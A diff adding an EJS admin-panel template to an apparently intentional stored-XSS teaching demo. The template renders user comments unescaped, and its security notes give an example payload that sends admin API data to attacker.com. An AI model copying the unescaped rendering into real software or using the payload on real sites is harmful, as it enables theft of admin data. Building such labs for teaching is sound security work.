@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Admin Panel - Stored XSS Demo</title>
+  <link rel="stylesheet" href="/css/style.css">
+  <style>
+    .admin-header {
+      background-color: #e74c3c;
+      color: white;
+      padding: 1rem;
+      text-align: center;
+      margin-bottom: 2rem;
+    }
+    
+    .admin-actions {
+      display: flex;
+      gap: 1rem;
+      margin-bottom: 1rem;
+    }
+    
+    .danger-btn {
+      background-color: #e74c3c;
+    }
+    
+    .danger-btn:hover {
+      background-color: #c0392b;
+    }
+    
+    .admin-badge {
+      background-color: #e74c3c;
+      color: white;
+      padding: 0.2rem 0.5rem;
+      border-radius: 4px;
+      font-size: 0.8rem;
+      margin-left: 0.5rem;
+    }
+  </style>
+</head>
+<body>
+  <header class="admin-header">
+    <h1>Admin Panel - Stored XSS Demo</h1>
+    <p>This panel is intentionally vulnerable to demonstrate how stored XSS can affect admin interfaces</p>
+  </header>
+  
+  <main>
+    <section>
+      <h2>Comment Management</h2>
+      <p>As an admin, you can view and manage all user-submitted comments.</p>
+      
+      <div class="admin-actions">
+        <a href="/" class="btn">Return to Public Site</a>
+        <form action="/admin/reset" method="POST" style="display: inline;">
+          <button type="submit" class="btn danger-btn">Reset All Comments</button>
+        </form>
+      </div>
+      
+      <div class="comments">
+        <% if (comments && comments.length > 0) { %>
+          <% comments.forEach(comment => { %>
+            <div class="comment">
+              <div class="comment-header">
+                <strong>Comment ID: <%= comment.id %></strong>
+                <span class="admin-badge">Admin View</span>
+              </div>
+              <div class="comment-content"><%- comment.content %></div>
+              <div class="comment-date"><%= new Date(comment.created_at).toLocaleString() %></div>
+              <form action="/admin/delete/<%= comment.id %>" method="POST" style="margin-top: 0.5rem;">
+                <button type="submit" class="btn danger-btn">Delete Comment</button>
+              </form>
+            </div>
+          <% }); %>
+        <% } else { %>
+          <p>No comments to display.</p>
+        <% } %>
+      </div>
+    </section>
+    
+    <section>
+      <h2>Security Notes</h2>
+      <p>This admin panel demonstrates how a stored XSS attack can target privileged users:</p>
+      <ul>
+        <li>Comments with malicious code are rendered directly in the admin interface</li>
+        <li>Admin sessions typically have higher privileges, making them valuable targets</li>
+        <li>Attackers might use "blind XSS" payloads that only trigger in the admin panel</li>
+        <li>Example payload: <code>&lt;img src="x" onerror="fetch('/api/admin-data').then(r=>r.json()).then(d=>fetch('https://attacker.com?'+btoa(JSON.stringify(d))))"&gt;</code></li>
+      </ul>
+    </section>
+  </main>
+  
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      console.log('Admin panel loaded - vulnerable to stored XSS');
+      
+      // This admin-only code would be accessible to XSS attacks
+      const adminData = {
+        username: 'admin',
+        role: 'administrator',
+        canManageUsers: true,
+        canDeleteContent: true
+      };
+      
+      // Admin-only methods that could be accessed by XSS
+      window.deleteAllComments = function() {
+        if (confirm('Are you sure you want to delete all comments?')) {
+          fetch('/admin/reset', { method: 'POST' })
+            .then(() => window.location.reload());
+        }
+      };
+    });
+  </script>
+</body>
+</html>
